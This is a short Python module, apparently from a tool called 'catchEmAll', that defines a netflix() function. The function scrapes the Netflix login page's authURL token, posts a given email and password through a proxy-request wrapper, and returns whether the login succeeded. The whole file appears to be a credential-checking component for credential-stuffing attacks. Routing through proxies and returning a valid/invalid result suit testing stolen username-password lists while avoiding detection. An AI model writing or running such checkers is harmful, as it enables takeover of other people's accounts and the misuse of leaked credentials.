from bs4 import BeautifulSoup

from catchEmAll.proxyrequests.proxy_requests import ProxyRequest


def netflix(usr: str, pwd: str, pr: ProxyRequest):
    site_url = "https://www.netflix.com/Login"

    res = pr.get(site_url)

    if res:
        soup = BeautifulSoup(res.text, features="html.parser")
        auth_url = soup.find('input', attrs={'name': 'authURL'})['value']

        # Post request to login
        res = pr.post(site_url,
                      data={'email': usr,
                            'password': pwd,
                            'rememberMe': True,
                            'flow': 'websiteSignUp',
                            'mode': 'login',
                            'action': 'loginAction',
                            'withFields': 'email,password,rememberMe,nextPage',
                            'authURL': auth_url,
                            'nextPage': 'https://www.netflix.com/viewingactivity'
                            })
        # pr.
        # pr.clear_cookies()
        if 'Login' not in res.url:
            return True
        else:
            return False
    else:
        # pr.clear_cookies()
        return False
